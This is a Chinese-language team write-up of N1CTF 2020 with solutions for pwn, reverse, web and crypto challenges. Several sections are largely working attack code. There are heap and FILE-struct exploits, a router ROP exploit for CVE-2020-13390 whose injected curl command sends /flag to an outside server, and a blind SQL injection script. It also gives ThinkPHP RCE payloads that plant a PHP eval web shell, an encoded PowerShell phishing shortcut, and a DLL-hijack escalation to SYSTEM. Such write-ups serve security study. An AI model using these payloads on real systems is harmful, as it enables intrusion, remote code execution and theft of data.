# N1CTF 2020 writeup

## PWN
### Signin
漏洞点在于vector的delete后没有清空指针，只是-8，并且没有校验边界，导致了可以一直执行delete操作导致越界。
```python=
from pwn import *
#context.log_level ='DEBUG'
def menu(choice):
    r.sendlineafter('>>',str(choice))
def add(idx,num): 
    menu(1)
    r.sendlineafter('dex',str(idx))
    r.sendlineafter('ber',str(num))

def free(idx):
    menu(2)
    r.sendlineafter('dex',str(idx))

def show(idx):
    menu(3)
    r.sendlineafter('dex',str(idx))

def gd(cmd=''):
    gdb.attach(r,cmd)
    pause()
libc=ELF('./libc.so')
#r=process('./signin')
r=remote('47.242.161.199',9990)
for i in range(0x120):
    add(1,1)
print 'stage 1'
for i in range(0xea+1+0x139-3):
    free(1)
print 'stage 2'
show(1)
r.recvuntil(':')
leak=int(r.recvline(),10)
print hex(leak)
lbase=leak-96-0x10-libc.symbols['__malloc_hook']
print hex(lbase)
print 'stage 3 start'
for i in range(0x24d4):
    free(1)
    print hex(i)
print 'stage 3 end'
add(1,lbase+libc.symbols['__free_hook']-8)
add(2,0x68732F6E69622F)
#gd('b system')
add(2,lbase+libc.symbols['system'])
add(2,lbase+libc.symbols['system'])
r.interactive()
```
### escape
https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/N1-escape.html

### babyrouter
CVE-2020-13390
entrys mitInterface 跟 page参数使用sprintf导致了栈溢出。
有00截断，但是调试的时候发现栈似乎不怎么变，所以直接硬编码栈地址试了下远程，直接成了
```python=
import requests
from pwn import *
cmd = ';curl -F flag=@/flag vps.exp.sh:1313;'

rop =  ''
rop += p32(0xf6fff9ec)
rop += cmd
rop += 'A'*(240-len(cmd) - 4) #padding - len(cmd) - len(0xf6fff9ec)
rop += p32(0xf6fff9ec)        # r4
rop += p32(0xf6fff9ec + 16)   # r11
rop += p32(0x6B154)           # pc
# .text:0006B154                 LDR             R0, [R11,#-16]
# .text:0006B158                 LDR             R1, [R11,#-20]
# .text:0006B15C                 MOV             R2, #0x1000
# .text:0006B160                 BL              doShell

data = {
    'entrys':'swings',
    'mitInterface':'swings',
    'page':rop
}

cookie = {'Cookie':'password=swingss'}

# r = requests.post('http://127.0.0.1:2333/goform/addressNat',data = data,cookies=cookie)

r = requests.post('http://8.210.119.59:9990/goform/addressNat',data = data,cookies=cookie)
```
![](https://i.imgur.com/02B6RKV.png)

### easywrite

```python=
from pwn import *

r = remote("124.156.183.246","20000")
libc = ELF("./libc-2.31.so")
context.arch  = libc.arch
r.recvuntil("Here is your gift:")
libc.address =int( r.recvline()[:-1],16)-0x8ec50

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    file_struct = p32(_flags) + \
            p32(0) + \
            p64(_IO_read_ptr) + \
            p64(_IO_read_end) + \
            p64(_IO_read_base) + \
            p64(_IO_write_base) + \
            p64(_IO_write_ptr) + \
            p64(_IO_write_end) + \
            p64(_IO_buf_base) + \
            p64(_IO_buf_end) + \
            p64(_IO_save_base) + \
            p64(_IO_backup_base) + \
            p64(_IO_save_end) + \
            p64(_IO_marker) + \
            p64(_IO_chain) + \
            p32(_fileno)
    file_struct = file_struct.ljust(0x88, "\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, "\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, "\x00")
    return file_struct

def payload_IO_file_finish(libc,_IO_str_jumps_addr, system_addr, binsh_addr):
    payload = pack_file(_flags = 0, 
                    _IO_read_ptr = 0x61, 
                    _IO_read_base = libc.sym['_IO_list_all']-0x10,
                    _IO_write_base = 0,
                    _IO_write_ptr = 1,
                    _IO_buf_base = binsh_addr,
                    _mode = 0x7fffffff,
                    _wide_data = 0x1eb880+libc,
                    )
    payload += p64(_IO_str_jumps_addr-8)
    payload += p64(0)
    payload += p64(system_addr)
    return payload

message = p32(0xdeadbeef)*(0x30-12)+p64(libc.sym['__free_hook']-0x8)*10
where = flat(libc.address+0x1f34f0)
r.sendafter("message",message)
r.sendafter("write?",where)
r.sendafter("Any last message?","/bin/sh\x00"+p64(libc.sym['system']))

r.interactive()
```

### W2L

权限没配好, 非预期解了

```shell=
mv bin bin1
/bin1/mkdir bin
/bin1/chmod 777 bin
/bin1/echo "/bin1/cat /root/flag" > /bin/umount
/bin1/chmod 777 /bin/umount
exit
```

## Re
### Oflo
签到题，子进程执行cat，父进程ptrace上去，获取结果作为key，然后异或
```python=
s = list(b"Linux version 4.19.104-microsoft-standard (")[0:14]
res = [53, 45, 17, 26, 73, 125, 17, 20, 43, 59, 62, 61, 60, 95]
for i in range(14):
    res[i] ^= s[i] + 2
print(b"n1ctf" + bytes(res))
```

### Oh My Julia
x64dbg调试，输入时下断点，跟出来到Julia编译后的地方，分析出算法。
flag分为5部分校验，用_分割
校验分别为直接对比，异或，中国剩余定理，简单位运算加密，快速幂。
```python=
from z3 import *
from struct import pack
from functools import reduce
import copy
import math
def egcd(a, b):
    """扩展欧几里得"""
    if 0 == b:
        return 1, 0, a
    x, y, q = egcd(b, a % b)
    x, y = y, (x - a // b * y)
    return x, y, q
def chinese_remainder(pairs):
    """中国剩余定理"""
    mod_list, remainder_list = [p[0] for p in pairs], [p[1] for p in pairs]
    mod_product = reduce(lambda x, y: x * y, mod_list)
    mi_list = [mod_product//x for x in mod_list]
    mi_inverse = [egcd(mi_list[i], mod_list[i])[0] for i in range(len(mi_list))]
    x = 0
    for i in range(len(remainder_list)):
        x += mi_list[i] * mi_inverse[i] * remainder_list[i]
        x %= mod_product
    return x
def rol(a, b):
    return (a << b | a >> (8-b)) & 0xff

a = b"n0w"
b = bytes(list(map(lambda x: x ^ 0xB1, [0xE8, 0xDE, 0xC4])))

c = chinese_remainder([(0x1337, 0x8FF), (0x18d9, 0x105a), (0x245f, 0x1595)])
c = pack("<I", c)

s = Solver()
d = [BitVec("x%d"%i, 8) for i in range(5)]
k = copy.copy(d)
d[0] = rol(d[0], 2)
d[2] = rol(d[2], 3)
d[3] = d[2] ^ d[3] ^ d[0]
kk = (d[4] ^ d[1] ^ (d[0] << 3)) & 0xff
d[1] = ((kk >> 1) | ((d[4] ^ d[1]) << 7)) & 0xff
d[4] = rol(d[4], 4)
d[0] = (d[0] ^ d[4] ^ (kk << 2)) & 0xff
res = [0x59, 0xBE, 0x62, 0xFA, 0x04]
s.add(d[0] == res[0])
s.add(d[1] == res[1])
s.add(d[2] == res[2])
s.add(d[3] == res[3])
s.add(d[4] == res[4])
assert s.check() == sat
m = s.model()
d = b""
for i in k:
    d += bytes([m[i].as_long()])
    
e = 6167994677750637846787284031284198699166724915292914207416625769922807110688701075146631681903787645131506509092609320621680335996011774133185924915744219183246974202510061588080450525756895523022680363592573974409387577754216307554444653180967764812466382206303916522606490290560284293010748494659520932252400522132701503847731262931700009254884130125557658811643798175788587564577224264756167863381391234404013004010044434222103569714559454690179319609962742145774093818530050466364779170297899996215415882749698196692126283911687170238829459195201541686347648768736129003321187960266022395285700138347393691701069800248507644296815948904642976231288390406392891137494265832494759401573097210850114663153274313756537534018109589206570602540559326039200848716638617367713171988711893402604262898551564788694015795986970388491176582531665735658490435481200684917725457390389445927207017739551104899293208031894691597567751372316173235969218701236129333475312126687483726518198884513431441373732322137387513411186113815489008204909882767211169670588119365268975311156035629164815032021033896627248205135889384062142533117427126174095664288229688983857514052912429373540989636730411614444500275895553786288524905672481290914962230663942978711977191617065355285376252300919856061262086308230629602563968135550187794697940223487471707339180184560459695301837543872635681488327980744438810932238175173336910108067161104524934145719389582851097368935750517077890034754480445239796065956023382953081104391321505492418879642843744083771488220776322694705558795406301099726143053265877629581376259736759379188070314677590380180875273589564613559077305039931521532889492874654116461687721433729560604345053665295353236076664587087994310194406827022786656499847672193385624034515585768388568701635965244814323298597210348083543194600191130177132309986678969373551829442002747485311866575378350703527238711102095369384336356910404004469356190806173157632587752829434386287114578291155464880709213641422876002393911662603315051364986980980896704848929494530865685081868837652490605249636514235057182207702952321657454456321540781618152251278528268041930821982417146538319344639262942409287413758365258936719585888245823584824787839695792942350835975325889291159555569773698908762648328204484224374476005032892196588715683423064219222095210187956084050428453531372674950072726211172825585275037410644186218960539109203196375294568056346977690840547747822508969530870855717294746523948068657810545614758240263248907656864643160983042403080961181298595656632900922716579858394871958904348170040153453056274611115019806506784108202367951401353592710709416624855402518608477578191464102129214837978994562796271286110818402775533844116138832972397140813091516932287622012692130454886149279432122660261892989759781348004545029997150326044796872548795315202824218021068605447949528282532753984199427360981380117727924707097097567755338759071037135582068677841242604984336821824912907298987321024269757948506834116030717378803260595543851757773593544092953717412777765946902006422552357788941850994131011985300156956761652763512117337592141362903770443640417077587868843401739463946011976427366277535691415538303315680898571953720879996801759034877085380157983224998649271609665774965177001138337677090025872131388597130451372531363
e = bin(int(math.log(e, 3)))
ee = e[2::][::-1]
e = b""
for i in ee:
    if i == '1':
        e += b"Z"
    else:
        e += b"z"
print(a + b"_" + b + b"_" + c + b"_" + d + b"_" + e)
```

### easy apk
ollvm，调试分析算法
替换表的base64+aes_cbc
```python

tbl = list(b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-/")
res = b"jZe3yJG3zJLHywu4otmZzwy/"
a = b""
for i in range(0, len(res), 4):
    t = list(map(lambda x: tbl.index(x), list(res[i:i+4])))
    s = [0 for i in range(3)]
    s[0] = ((t[0] & 0x3f) << 2) | ((t[1] >> 4) & 3)
    s[1] = ((t[1] & 0xf) << 4) | ((t[2]>>2) & 0xf)
    s[2] = (t[3] & 0x3f) | ((t[2] & 3) << 6)
    a += bytes(s)
f1 = a[1:-1]

k2 = b"17b87f9aae8933ef"
k1 = b"'17b87f9aae8933efn1ctf{}"
cipher = b"'7890123456789012"
res = bytes([0xA5, 0xA4, 0x4C, 0x0D, 0xD2, 0x52, 0x1E, 0x63, 0x54, 0xC5, 0x29, 0xFA, 0xE4, 0xEC, 0x1F, 0x27, 0x52, 0xD2, 0xF1, 0xB7, 0xE4, 0x1C, 0x61, 0x42, 0x77, 0x9F, 0x5D, 0xA1, 0x87, 0x0A, 0xEC, 0x55])
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
aes = AES.new(k1, iv=k2[0:16], mode=AES.MODE_CBC)
cipher = pad(cipher, 16)
f2 = unpad(aes.decrypt(res), 16)[1:]
print(b"n1ctf{" + f1 + f2 + b"}")
```

### N1egg In Fixed Camera
彩蛋题，strings一下level0找到flag

### easyre
虚拟机，用异常处理来控制路径，再就没啥了
```
import os

def swap_b(x):
    return (x<<4)&0xf0 | (x>>4)&0xf

stack = [0x31,0x4e]

flag = [0x43 for i in range(0x64)]
flag[0] = ord('n')
flag[1] = ord('1')
flag[2] = ord('c')
flag[3] = ord('t')
flag[4] = ord('f')
flag[5] = ord('{')


# result_i
#['700', '500', '1056', '998', '1212', '1467', '1279', '1594', '1606', '2077', '2299', '2326', '2238', '2261', '2363', '2813', '2924', '2786', '2935', '3179', '3281', '3354', '3325', '3417', '3535', '3396', '3547', '3825', '3754', '4145', '4382', '4423', '4532', '4489', '4766', '4769', '4701', '4911', '5133', '5078', '5084', '5059', '5496', '5499', '5483', '5484', '6176', '6203', '6276', '6044', '6729', '6668', '6906', '6965', '6886', '7134', '']
fp = open("result_i",'rb')
result = fp.read()
fp.close()

result = result.split('\n')
print result

f = 1

# flag[6] = flag[6] ^ stack[0]
# stack[0] = flag[6]

summ = 0
for i in range(6):
    summ += flag[i]
print summ

xchange_t = [0,0,0,0,0,0,0]
for i in range(100):
    if i%2 == 0:
        xchange_t.append(1)
        xchange_t.append(1)
    else:
        xchange_t.append(0)
        xchange_t.append(0)

i = 0
while True:
    if i > len(result)-2:
        break
    #print result[i]
    x = abs(int(result[i],10) - summ)
    print x
    if xchange_t[i+6] == 0:
        flag[i+6] = x ^ stack[0]
        stack[0] = x
    else:
        flag[i+6] = x ^ stack[1]
        flag[i+6] = swap_b(flag[i+6])
        stack[1] = x
    summ += x
    i += 1

print ''.join([chr(x) for x in flag])


# for i in range(6,0x40):
#     print 'flag[' + hex(i)[2:] + ']:' + hex(flag[i])

# summ = 0
# for i in range(6):
#     summ += flag[i]
# print summ
```

## Web
### Signln
```python

import requests
import string
import re

url = "http://101.32.205.189/?input=O%3A4%3A%22flag%22%3A2%3A%7Bs%3A2%3A%22ip%22%3Bs%3A9%3A%22callmecro%22%3Bs%3A5%3A%22check%22%3Bs%3A25%3A%22n1ctf20205bf75ab0a30dfc0c%22%3B%7D"

characters = string.printable[:-5]
r = requests.get(url)
if "n1ctf{" in r.text:
    flag = "".join(re.findall(r'n1ctf{.*}',r.text))
    exit(flag)

sql ="select `key` from n1key"
exp = "'||(select ip from n1ip where updatexml(1,concat('~',(select if(ascii(substring((%s),%d,1))=%d,'n1ctf','callmecro')),'~'),3))||'"

res = ""

for i in range(1,100):
    flag = True
    for char in characters:
        payload = exp % (sql, i, ord(char))
        #payload = exp
        headers = {
            "X-Forwarded-For":payload
        }
        r = requests.get(url,headers=headers)
        if 'welcome to n1ctf2020<' in r.text:
            res += char
            print(res)
            flag = False
            break
    if flag:
        break
# key = n1ctf20205bf75ab0a30dfc0c
```


### The king of phish(victim-bot)
创建类似这样的powershell的快捷方式
```
powershell -exec bypass -encodedCommand blahblah...
```
然后手工更改lnk文件里面的0x20为0x09
直接发过去就上线了

### The king of phish(UserA-PC)
上去一看whoami开了SeRestorePrivilege，思路就很明显了。
这是超级权限，允许修改任何文件和任何注册表。。。

用usodllloader，写个自己的WindowsCoreDeviceInfo.dll，CreateFile的时候带上FILE_FLAG_BACKUP_SEMANTICS，直接写入system32文件夹。

触发加载直接得到system的shell。

### zabbix_fun
首先`Admin` `zabbix`登录。查看下agent的ip地址

![](https://i.imgur.com/0V2kMt2.png)

之后配置host，使能zbx

![](https://i.imgur.com/N35vcMr.png)

再用监控项(item)读文件就行了

![](https://i.imgur.com/x2Bzi9J.png)

### easy_tp5
发现tp版本是5.0.0，存在RCE的payload，但是由于open_basedir的设置和disabled_functions，导致了无法执行命令。

所以思路就是往web目录下面写一个自己的shell，这样就可以逃出这个漏洞的限制，找到了Build类的module方法

在其中的buildHello方法中，存在写文件的操作，通过构造payload即可往public下面写一个Index.php文件

![](https://i.imgur.com/lSmGtFj.png)

但是因为我们只能调用一个参数的函数，并且这个参数必须要是字符串，所以我们要向上找一步，发现module方法完全符合我们的要求，所以利用这一点，我们就可以写一个shell：

![](https://i.imgur.com/EpWrk73.png)

因为pathinfo的原因，需要找到一个包含，而不能直接访问我们的文件，所以使用Loader类的__include_file来包含刚才写的文件，进而getshell

payload：
写文件：

`_method=__construct&filter[]=think\Build::module&method=GET&get[]=index//../../public/?><?php eval($_REQUEST[1]);`

包含文件`_method=__construct&filter[]=think\__include_file&method=GET&get[]=/var/www/html/public/?><?php eval($_REQUEST[1]);/controller/Index.php`

最后利用蚁剑连上去，一键bypass disable_function就可以了

![](https://i.imgur.com/ZDecAtx.png)



## misc
### Signln
Welcome to N1CTF 2020.

n1ctf{welc0m3_to_n1ctf2020_ctfers}
### AllSignIn
![](https://i.imgur.com/sQtOW3F.png)


## Crypto

### vss
预测随机数
https://github.com/kmyk/mersenne-twister-predictor/blob/master/mt19937predictor.py
```python
from PIL import Image
import qrcode
import random
from mt19937predictor import MT19937Predictor

im = Image.open("share2.png")
m,n = im.size
m //= 2
n //= 2
f = []
for idx in range(n*m):
    i, j = idx//n, idx % n
    a1=im.getpixel((2*j,2*i))
    a2=im.getpixel((2*j,2*i+1))
    a3=im.getpixel((2*j+1,2*i))
    a4=im.getpixel((2*j+1,2*i+1))
    assert a1==a2 and a3==a4
    c = a1 & 1
    # pixel ^ flip == c
    f.append(c)

qr = qrcode.QRCode(
    version=1,
    error_correction=qrcode.constants.ERROR_CORRECT_L,
    box_size=12,
    border=4,
)

for l in range(50):
    FLAG='n1ctf{'+''.join(random.choice('abcdef-_1234567890') for _ in range(l))+'}'
    qr.add_data(FLAG)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    if img.size[0] == 444 and img.size[1] == 444:
        img.save('test.png')
        break

l = 624*32
#l = len(data) & (~0b11111)
data = [x&1 for x in list(img.getdata())[-l:]]
flip = [x^y for x,y in zip(data,f[-l:])]
r = ''.join(chr(x+48) for x in flip)
r = int(r, 2)
pred = MT19937Predictor()
pred.setrandbits(r, l)
bits = pred.getrandbits(444*444-l)
bits = bin(bits)[2:].rjust(444*444-l, '0')
flip = [int(x) for x in bits] + flip

im = Image.new("L", (m,n))
data = [(x ^ y)*255 for x, y in zip(f, flip)]
im.putdata(data)
im.save('qr.png')
```

### curve
看上去像是 ECDH 的 DDH 问题, 但是实际上 smart attack 直接求 dlp 就行了. 一次 2 秒, 30 次 90 秒以内没问题.

```python
# generate curve
p = 0
m = 2^256
while p not in Primes():
    p = 11*m*(m + 1) + 3
    m += 1
E=EllipticCurve(GF(p), j=-2^15)
if E.order() != p:
    E=E.quadratic_twist()

# attack
for i in range(30):
    s = io.recvline()

    l = s.decode().split("(")

    g0 = E(eval("("+l[-3].replace(":",",")))
    g1 = E(eval("("+l[-2].replace(":",",")))
    c01 = E(eval("("+l[-1].replace(":",",")))

    k = SmartAttack(P,g1,p)

    if k*g0 == c01:
        io.sendline("0")
    else:
        io.sendline("1")
```
*注: 因为是 jupyter 所以懒得一个个 block 去 copy, 也懒得导出代码再排版, 就贴一下关键代码, 下同*

### FlagBot
注意到 secret 被公用, 可求其模不同 order 的阶再 CRT. 这里只选择小于 2^40 的阶:
```python
# factor order
for i in range(7):
    o = gens[i].order()
    k = 1
    kk = list(factor(o/k))[-1][0]
    while kk > 2^40:
        k *= kk
        kk = list(factor(o/k))[-1][0]
    rgens.append(k*gens[i])
    rpubs.append(k*pubs[i])
    rorder.append(rgens[i].order())
    
# dlp
o = 1
for i in range(7):
    o = lcm(o,rorder[i])
    print(factor(rorder[i]))
    rsecret.append(rgens[i].discrete_log(rpubs[i]))
    print(o)
    print(o > 2^255)

# crt
secret = rsecret[0]
o = rorder[0]
for i in range(1,7):
    secret = crt(secret,rsecret[i],o,rorder[i])
    o = lcm(o,rorder[i])
    print(secret)
```

### BabyProof
没看懂跟 ZKP 有啥关系, 但是一看就是类似于 DSA 的 LLL. 大概先估算一下需要 60 组数据比较稳妥 ( $247 > 256*n/(n+1) - log(n)/2$ ). 但是因为速度太慢就只要了 44 组数据.
```python
M = Matrix(ZZ, m+2,m+2)
for i in range(m):
    M[i,i] = qs[i]
    M[-2,i] = cs[i]
    M[-1,i] = rs[i]
M[-1,-1] = 2^246
M[-2,-2] = 1
```
